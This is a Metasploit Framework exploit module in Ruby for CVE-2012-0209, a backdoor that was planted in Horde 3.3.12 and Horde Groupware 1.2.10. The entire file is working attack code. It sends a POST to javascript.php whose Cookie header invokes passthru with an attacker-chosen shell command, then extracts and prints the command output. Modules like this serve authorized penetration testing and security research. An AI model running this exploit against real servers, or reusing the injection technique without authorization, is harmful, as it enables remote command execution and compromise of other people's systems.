##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Horde 3.3.12 Backdoor Arbitrary PHP Code Execution',
      'Description'    => %q{
          This module exploits an arbitrary PHP code execution vulnerability introduced
        as a backdoor into Horde 3.3.12 and Horde Groupware 1.2.10.
      },
      'Author'         => [
        'Eric Romang',  # first public PoC
        'jduck'         # Metasploit module
      ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2012-0209'],
          [ 'URL', 'http://dev.horde.org/h/jonah/stories/view.php?channel_id=1&id=155' ],
          [ 'URL', 'http://eromang.zataz.com/2012/02/15/cve-2012-0209-horde-backdoor-analysis/' ]
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'BadChars' => "\x0a\x0d",
          'DisableNops' => true,
          'Space'       => 4096,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
            }
        },
      'Platform'       => [ 'unix', 'linux' ],
      'Arch'           => ARCH_CMD,
      'DefaultTarget'  => 0,
      'Targets'        => [[ 'Automatic', { }]],
      'DisclosureDate' => 'Feb 13 2012'
      ))

      register_options(
        [
          OptString.new('URI', [true, "Path to Horde installation", "/horde"]),
          OptString.new('APP', [true, "App parameter required by javascript.php (must be active)", "horde"]),
        ], self.class)
  end

  def exploit
    # Make sure the URI begins with a slash
    uri = datastore['URI']
    if uri[0,1] != '/'
      uri = '/' + uri
    end

    # Make sure the URI ends without a slash, because it's already part of the URI
    if uri[-1, 1] == '/'
      uri = uri[0, uri.length-1]
    end

    function = "passthru"
    key = Rex::Text.rand_text_alpha(6)
    arguments = "echo #{key}`"+payload.raw+"`#{key}"

    res = send_request_cgi({
      'uri'     => uri + "/services/javascript.php",
      'method'  => 'POST',
      'ctype'   => 'application/x-www-form-urlencoded',
      'data'    => "app="+datastore['APP']+"&file=open_calendar.js",
      'headers' =>
      {
        'Cookie' => "href="+function+":"+arguments,
        'Connection' => 'Close',
      }
    }) #default timeout, we don't care about the response

    if (res)
      print_status("The server returned: #{res.code} #{res.message}")
    end

    resp = res.body.split(key)
    if resp and resp[1]
      print_status(resp[1])
    else
      print_error("No response found")
    end

    handler
  end

end
